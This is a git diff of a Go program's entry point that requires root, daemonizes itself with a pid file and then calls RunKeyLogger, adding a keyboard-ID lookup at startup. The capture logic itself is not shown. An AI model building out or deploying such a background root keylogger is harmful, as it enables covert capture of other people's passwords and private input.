@@ -8,20 +8,23 @@ import (
 )
 
 var ctx *daemon.Context
+var kbid int
 
 func main() {
+
 	err := checkRoot()
 	checkErr(err)
-	d, err := ctx.Reborn()
+	child, err := ctx.Reborn()
 	checkErr(err)
-	if d != nil {
+	if child != nil {
 		return
 	}
 	defer ctx.Release()
-	log.Println(os.Getpid())
+	log.Println("pid = ", os.Getpid())
 	RunKeyLogger()
 }
 func init() {
+	kbid = getKeyboardID()
 	ctx = &daemon.Context{
 		PidFileName: "pid",
 		PidFilePerm: 0755,
